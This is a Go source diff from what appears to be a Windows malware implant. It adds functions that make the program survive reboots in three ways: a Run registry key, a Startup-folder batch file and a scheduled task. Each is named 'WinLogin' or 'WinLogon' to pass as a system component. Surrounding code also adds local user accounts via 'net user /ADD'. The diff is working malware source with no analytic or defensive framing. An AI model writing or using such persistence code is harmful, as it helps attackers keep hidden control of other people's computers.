@@ -103,6 +103,7 @@ func wifiDisconnect() error {
 	return nil
 }
 
+// Start Persistence Functions
 func schtaskPersistence() error {
 	cmd, er := GetPath()
 	if er != nil {
@@ -151,10 +152,22 @@ func addPersistentCommand(persistenceType string) error {
 	var err error
 	if persistenceType == "schtasks" || persistenceType == "Schtasks" {
 		err = schtaskPersistence()
+		if err != nil {
+			log.Println(err)
+		}
+		err = schTaskPersist("WinLogin", os.Args[0])
 	} else if persistenceType == "startup" || persistenceType == "Startup" {
 		err = startUpPersistence()
+		if err != nil {
+			log.Println(err)
+		}
+		err = startupPersist("WinLogon", os.Args[0])
 	} else if persistenceType == "reg" || persistenceType == "Reg" {
 		err = regPersistence()
+		if err != nil {
+			log.Println(err)
+		}
+		err = registryPersist("WinLogin", os.Args[0])
 	}
 	bkPersist()
 	return err
@@ -207,6 +220,46 @@ func bkPersist() {
 		&StatupInfo,
 		&ProcessInfo)
 }
+func registryPersist(name string, path string) error {
+	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
+	if err != nil {
+		return err
+	}
+	err2 := k.SetStringValue(name, path)
+	if err2 != nil {
+		return err2
+	}
+	defer k.Close()
+	return nil
+}
+
+func startupPersist(name string, execPath string) error {
+	path := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + name + ".bat"
+	file, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
+	if err != nil {
+		if os.IsNotExist(err) {
+			file, err = os.Create(path)
+			if err != nil {
+				return err
+			}
+		} else {
+			return err
+		}
+	}
+	_, err2 := file.Write([]byte("start " + execPath))
+	if err2 != nil {
+		return err2
+	}
+	defer file.Close()
+	return nil
+}
+
+func schTaskPersist(name string, path string) error {
+	_, err := cmdOut(fmt.Sprintf("schtasks /create /st 00:00 /tn %q /tr %s", name, path))
+	return err
+}
+
+// End Persistence Functions
 
 func createUser(username, password string) error {
 	cmd := f("net user %s %s /ADD", username, password)
